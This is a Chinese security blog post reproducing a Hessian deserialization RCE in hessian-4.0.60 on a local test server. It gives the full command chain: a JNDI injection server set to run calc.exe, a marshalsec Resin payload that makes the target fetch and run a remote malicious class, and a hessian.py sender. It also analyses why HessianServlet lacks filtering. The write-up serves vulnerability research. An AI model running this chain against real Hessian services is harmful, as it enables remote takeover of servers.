**Hessian是一个轻量级的RPC框架。它基于HTTP协议传输，使用Hessian二进制序列化，对于数据包比较大的情况比较友好。**

Hessian反序列化类似Java反序列化,可导致RCE,POC好像2017年就公开了，但是最新版本hessian-4.0.60.jar,经过测试也存在反序列化RCE问题。

使用marshalsec项目工具(<https://github.com/mbechler/marshalsec>)可生成利用payload,包括SpringCompAdv,Resin,
ROME, XBean

![](https://image.3001.net/images/20191231/1577779193_5e0afff9179f6.png!small)

下面使用Resin payload复现Hessian反序列化RCE漏洞

##  一、搭建测试环境

测试环境使用最新jar包

![](https://image.3001.net/images/20191231/1577779280_5e0b0050cf782.png!small)

将HessianTest.war放到tomcat/webapp/目录下并启动tomcat

![](https://image.3001.net/images/20191231/1577779311_5e0b006f19d80.png!small)

访问服务器地址<http://127.0.0.1:8080/HessianTest/hessian>,返回如下页面则说明环境正常

![](https://image.3001.net/images/20191231/1577779331_5e0b0083418f4.png!small)

##  二、启动JNDI利用工具

JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar是某大佬写得JNDI注入利用工具,项目地址<https://github.com/welk1n/JNDI-Injection-Exploit>

编译后JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar

执行命令:java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc.exe -A
127.0.0.1

-C为需要执行的命令 -A为监听地址

![](https://image.3001.net/images/20191231/1577779443_5e0b00f310b67.png!small)

##  三、生成payload

marshalsec工具地址<https://github.com/mbechler/marshalsec>

编译后的marshalsec-0.0.3-SNAPSHOT-all.jar

执行命令:

    
    
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Resin <http://127.0.0.1:8180/> ExecTemplateJDK7>hession

![](https://image.3001.net/images/20191231/1577779461_5e0b0105a6e98.png!small)

将在当前目录生成hession的payload

注意:<http://127.0.0.1:8180/ExecTemplateJDK7> 为 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar工具启动后生成的恶意代码地址

##  四、发送payload到hessian服务器

使用hessian.py 发送序列化的payload到服务器

执行命令:

    
    
    python hessian.py -u <http://127.0.0.1:8080/HessianTest/hessian> -p hessian

![](https://image.3001.net/images/20191231/1577779477_5e0b01158ae40.png!small)

可以看到服务器已经去JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar上下载恶意类并执行弹出计算器

![](https://image.3001.net/images/20191231/1577779493_5e0b012559430.png!small)

##  五、分析

使用hession的web项目需要配置web.xml,映射com.caucho.hessian.server.HessianServlet之相应的路径

![](https://image.3001.net/images/20191231/1577779512_5e0b013804e7d.png!small)

Java客户端可以很方便的调用服务器上的方法,如下

![](https://image.3001.net/images/20191231/1577779530_5e0b014aa8a29.png!small)

查看com.caucho.hessian.server.HessianServlet的代码

service方法处理客户端发来的http请求,调用

![](https://image.3001.net/images/20191231/1577779596_5e0b018ce3b68.png!small)

![](https://image.3001.net/images/20191231/1577779619_5e0b01a3e2e08.png!small)

调用HessianSkeleton的invoke方法,将从客户端发来的数据流中读取对象

![](https://image.3001.net/images/20191231/1577779635_5e0b01b3b2b42.png!small)

看代码里面好像没有什么黑白名单过滤机制

通过抓取请求包,分析,构造请求包,将marshalsec工具生成的Resion payload发送给服务器

下面是构造请求包的hessian.py代码

![](https://image.3001.net/images/20191231/1577779651_5e0b01c3efd95.png!small)

利用图

![](https://image.3001.net/images/20191231/1577779666_5e0b01d23275a.png!small)
这是发送给Hessain服务器的请求包

![](https://image.3001.net/images/20191231/1577779687_5e0b01e785ba7.png!small)

所有工具打包地址

> <https://github.com/21superman/Hessian-Deserialize-RCE>

***本文作者：21superman，转载请注明来自FreeBuf.COM**

